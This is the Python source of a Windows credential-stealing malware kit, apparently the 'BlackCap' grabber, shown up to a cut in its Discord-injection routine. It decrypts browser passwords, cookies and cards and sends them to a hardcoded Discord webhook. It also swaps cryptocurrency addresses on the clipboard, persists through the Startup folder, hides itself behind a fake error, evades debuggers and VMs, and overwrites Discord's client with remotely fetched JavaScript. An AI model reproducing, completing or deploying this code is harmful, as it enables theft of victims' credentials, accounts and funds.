import asyncio
import json
import ntpath
import os
import random
import re
import shutil
import sqlite3
import subprocess
import threading
import winreg
import zipfile
import httpx
import psutil
import base64
import requests
import ctypes
import time
import pyperclip
import win32gui
import win32con


from sqlite3 import connect
from base64 import b64decode
from urllib.request import Request, urlopen
from shutil import copy2
from datetime import datetime, timedelta, timezone
from sys import argv
from tempfile import gettempdir, mkdtemp
from json import loads, dumps
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData


local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

Passw = [];

# `
#    "yourwebhookurl" = your discord webhook url
#    "blackcap_inject_url" = my javascript injection (i recommand to not change)
#    "hide" = you want to hide grabber? ('yes' or 'no')
#    "dbugkiller" = recommand to let this
#    "blprggg" = don't touch at this
#
# `



__config__ = {
    'yourwebhookurl': "https://canary.discord.com/api/webhooks/1398173246918234196/ZFe3gHPQ1v6BoN6NzqN8wuEi0yT0AzdktFAtRZu63tqtVqwieS3VvB4hnshtCZ8h8NWM",
    'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
    'hide': '%_hide_script%',
    'ping': '%ping_enabled%',
    'pingtype': '%ping_type%',
    'fake_error':'%_error_enabled%',
    'startup': '%_startup_enabled%',
    'kill_discord_process': '%kill_discord_process%',
    'dbugkiller': '%_debugkiller%',
    
    'addresse_crypto_replacer': '%_address_replacer%',
    'addresse_btc': '%_btc_address%',
    'addresse_eth': '%_eth_address%',
    'addresse_xchain': '%_xchain_address%',
    'addresse_pchain': '%_pchain_address%',
    'addresse_cchain': '%_cchain_address%',
    'addresse_monero': '%_monero_address%',
    'addresse_ada': '%_ada_address%',
    'addresse_dash': '%_dash_address%',
    'blprggg':
    [
        "httpdebuggerui",
        "wireshark",
        "fiddler",
        "regedit",
        "cmd",
        "taskmgr",
        "vboxservice",
        "df5serv",
        "processhacker",
        "vboxtray",
        "vmtoolsd",
        "vmwaretray",
        "ida64",
        "ollydbg",
        "pestudio",
        "vmwareuser",
        "vgauthservice",
        "vmacthlp",
        "x96dbg",
        "vmsrvc",
        "x32dbg",
        "vmusrvc",
        "prl_cc",
        "prl_tools",
        "xenservice",
        "qemu-ga",
        "joeboxcontrol",
        "ksdumperclient",
        "ksdumper",
        "joeboxserver"
    ]

}




infocom = os.getlogin()
vctm_pc = os.getenv("COMPUTERNAME")
r4m = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
d1sk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]

BlackCap_Regex = 'https://paste.bingner.com/paste/fhvyp/raw'
reg_req = requests.get(BlackCap_Regex) 
clear_reg = r"[\w-]{24}\." + reg_req.text




class Functions(object):

    @staticmethod
    def gtmk3y(path: str or os.PathLike):
        if not ntpath.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        try:
            master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
            return Functions.w1nd0_dcr(master_key[5:])
        except KeyError:
            return None

    @staticmethod
    def cnverttim(time: int or float) -> str:
        try:
            epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
            codestamp = epoch + timedelta(microseconds=time)
            return codestamp
        except Exception:
            pass

    @staticmethod
    def w1nd0_dcr(encrypted_str: bytes) -> str:
        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

    @staticmethod
    def cr34t3_f1lkes(_dir: str or os.PathLike = gettempdir()):
        f1lenom = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = ntpath.join(_dir, f1lenom)
        open(path, "x")
        return path

    @staticmethod
    def dcrpt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}"'

    @staticmethod
    def g3t_H(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def sys_1fo() -> list:
        flag = 0x08000000
        sh1 = "wmic csproduct get uuid"
        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            uuidwndz = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
        except Exception:
            uuidwndz = "N/A"
        try:
            w1nk33y = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
        except Exception:
            w1nk33y = "N/A"
        try:
            w1nv3r = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
        except Exception:
            w1nv3r = "N/A"
        return [uuidwndz, w1nv3r, w1nk33y]


    @staticmethod
    def net_1fo() -> list:
        ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
        req = httpx.get("https://ipinfo.io/json")
        if req.status_code == 200:
            data = req.json()
            ip = data.get('ip')
            city = data.get('city')
            country = data.get('country')
            region = data.get('region')
            org = data.get('org')
            loc = data.get('loc')
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
        return [ip, city, country, region, org, loc, googlemap]

    @staticmethod
    def fetch_conf(e: str) -> str or bool | None:
        return __config__.get(e)










class auto_copy_wallet(Functions):
    def __init__(self):
        self.address_st3aler = self.fetch_conf("addresse_crypto_replacer")
        self.address_btc = self.fetch_conf("addresse_btc")
        self.address_eth = self.fetch_conf("addresse_eth")
        self.address_xchain = self.fetch_conf("addresse_xchain")
        self.address_pchain = self.fetch_conf("addresse_pchain")
        self.address_cchain = self.fetch_conf("addresse_cchain")
        self.address_monero = self.fetch_conf("addresse_monero")
        self.address_ada = self.fetch_conf("addresse_ada")
        self.address_dash = self.fetch_conf("addresse_dash")


    def address_swap(self):
        try:
            clipboard_data = pyperclip.paste()
            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):
                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
                    if self.address_btc != "none":
                        pyperclip.copy(self.address_btc)
                        pyperclip.paste()
            
            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):
                pyperclip.copy(self.address_eth)
                pyperclip.paste()
                
            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
                if self.address_xchain != "none":
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_xchain)
                        pyperclip.paste()
                
                
            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
                if self.address_pchain != "none":
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_pchain)
                        pyperclip.paste()
                
                
            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):
                if self.address_cchain != "none":
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_cchain)
                        pyperclip.paste()
                
                
            if re.search('addr1[a-z0-9]+', clipboard_data):
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_ada)
                        pyperclip.paste()
                
            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):
                if self.address_dash != "none":
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_dash)
                        pyperclip.paste()
                
            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):
                if self.address_monero != "none":
                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:
                        pyperclip.copy(self.address_monero)
                        pyperclip.paste()
                
                
        except:
            data = None
            
            
    def loop_through(self):
        
        while True:
            self.address_swap()
     
    def run(self):
        if self.address_st3aler == "yes":
            self.loop_through()


class bc_initial_func(Functions):
    def __init__(self):
        
        self.dscap1 = "https://discord.com/api/v9/users/@me"

        self.discord_webhook = self.fetch_conf('yourwebhookurl')

        self.hide = self.fetch_conf("hide")

        self.pingtype = self.fetch_conf("pingtype")

        self.pingonrun = self.fetch_conf("ping")
        
        self.baseurl = "https://discord.com/api/v9/users/@me"

        self.startupexe = self.fetch_conf("startup")
        
        self.fake_error = self.fetch_conf("fake_error")

        self.appdata = os.getenv("localappdata")

        self.roaming = os.getenv("appdata")
        
        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')

        self.dir, self.temp = mkdtemp(), gettempdir()

        inf, net = self.sys_1fo(), self.net_1fo()

        self.uuidwndz, self.w1nv3r, self.w1nk33y = inf[0], inf[1], inf[2]

        self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]

        self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

        self.regex_webhook_dsc = "api/webhooks"

        self.chrmrgx = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE);
        
        self.baseurl = "https://discord.com/api/v9/users/@me"

        self.regex = clear_reg

        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []

        self.bc_id = []

        self.sep = os.sep;

        self.robloxcookies = [];

        self.chrome_key = self.gtmk3y(ntpath.join(self.chrmmuserdtt, "Local State"));


        os.makedirs(self.dir, exist_ok=True);


    


    def error_remote(self: str) -> str:
        if self.fake_error == "yes":
            ctypes.windll.user32.MessageBoxW(None, 'Error code: Windows_0x988958\nSomething gone wrong.', 'Fatal Error', 0)

    def ping_on_running(self: str) -> str:
        ping1 = {
            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
            'content': "@everyone"
            }
        ping2 = {
            'avatar_url': 'https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png',
            'content': "@here"
            }
        if self.pingonrun == "yes":
            if self.regex_webhook_dsc in self.discord_webhook:
                if self.pingtype == "@everyone" or self.pingtype == "everyone":
                    httpx.post(self.discord_webhook, json=ping1)
            if self.pingtype == "@here" or self.pingtype == "here":
                if self.regex_webhook_dsc in self.discord_webhook :
                    httpx.post(self.discord_webhook, json=ping2)



    def startupblackcap(self: str) -> str:
        if self.startupexe == "yes":
            startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
            if os.path.exists(startup_path + argv[0]):
                os.remove(startup_path + argv[0])
                copy2(argv[0], startup_path)
            else:
                copy2(argv[0], startup_path)


                
    def hidethis(self: str) -> str:
        if self.hide == "yes":
            hide = win32gui.GetForegroundWindow()
            win32gui.ShowWindow(hide, win32con.SW_HIDE)




    def bc_exit_this(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        os._exit(0)

    def extract_try(func):
        '''Decorator to safely catch and ignore exceptions'''
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def init(self):
        self.browsers = {
            'amigo': self.appdata + '\\Amigo\\User Data',
            'torch': self.appdata + '\\Torch\\User Data',
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'edge': self.appdata + "\\Microsoft\\Edge\\User Data"

        }        
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        if self.discord_webhook == "" or self.discord_webhook == "\x57EBHOOK_HERE":
            self.bc_exit_this()
            
        self.hidethis()
        self.error_remote()
        self.startupblackcap()

        if self.fetch_conf('dbugkiller') and NoDebugg().inVM is True:
            self.bc_exit_this()
        await self.bypass_bttdsc()
        await self.bypass_tokenprtct()

        function_list = [self.steal_screen, self.system_informations, self.steal_token, self.grabb_mc, self.grabb_roblox]


        if self.fetch_conf('kill_discord_process'):

            await self.kill_process_id()



        os.makedirs(ntpath.join(self.dir, 'Browsers'), exist_ok=True)
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.gtmk3y(path + '\\Local State')
            self.funcs = [
                self.steal_cookies2,
                self.steal_history2,
                self.steal_passwords2,
                self.steal_cc2
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        pass
            
        if ntpath.exists(self.chrmmuserdtt) and self.chrome_key is not None:
            os.makedirs(ntpath.join(self.dir, 'Google'), exist_ok=True)
            function_list.extend([self.steal_passwords, self.steal_cookies, self.steal_history])

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.natify_matched_tokens()
        await self._inject_disc()
        self.ping_on_running()
        self.finished_bc()

    

    async def _inject_disc(self):
        # TO DO: reduce cognetive complexity
        for _dir in os.listdir(self.appdata):

            if 'discord' in _dir.lower():
                discord = self.appdata + os.sep + _dir
                for __dir in os.listdir(ntpath.abspath(discord)):

                    if re.match(r'app-(\d*\.\d*)*', __dir):
                        app = ntpath.abspath(ntpath.join(discord, __dir))
                        modules = ntpath.join(app, 'modules')


                        if not ntpath.exists(modules):
                            return


                        for ___dir in os.listdir(modules):

                            if re.match(r"discord_desktop_core-\d+", ___dir):
                                inj_path = modules + os.sep + ___dir + f'\\discord_desktop_core\\'

                                if ntpath.exists(inj_path):

                                    if self.srtupl0c not in argv[0]:
                                        try:
                                            os.makedirs(inj_path + 'blackcap', exist_ok=True)
                                        except PermissionError:
                                            pass

                                    if self.regex_webhook_dsc in self.discord_webhook:
                                        
                                        f = httpx.get(self.fetch_conf('blackcap_inject_url')).text.replace("%WEBHOOK%", self.discord_webhook)#.replace("%num_core_discord%", inj_path + 'index.js')
                                    
                                    try:
                                        with open(inj_path + 'index.js', 'w', errors="ignore") as indexFile:
                                            indexFile.write(f)
                                    except PermissionError:
                      
